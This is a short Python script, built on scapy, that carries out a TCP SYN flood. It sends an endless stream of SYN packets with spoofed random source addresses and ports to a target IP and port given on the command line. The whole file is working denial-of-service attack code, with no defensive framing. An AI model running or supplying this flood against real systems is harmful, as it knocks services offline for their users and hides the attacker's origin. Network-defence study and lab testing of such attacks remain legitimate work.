from scapy.all import *
import sys
import random

class SYNAttacker:
    '''
    TCP SYN Flooding Attack
    '''

    def attack(self, victim_ip, victim_port):
        while True:
            a, b, c, d, port = random.randint(100, 255), random.randint(100, 255), random.randint(100, 255), \
                               random.randint(100, 255), random.randint(1024, 60000)
            src_ip = f'{a}.{b}.{c}.{d}'
            ip_layer = IP(src=src_ip, dst=victim_ip)
            tcp_layer = TCP(sport=port, dport=victim_port, flags='S')
            packet = ip_layer / tcp_layer
            send(packet)


if __name__ == "__main__":
    target_ip, target_port = sys.argv[1], sys.argv[2]
    attacker = SYNAttacker()
    attacker.attack(target_ip, int(target_port))
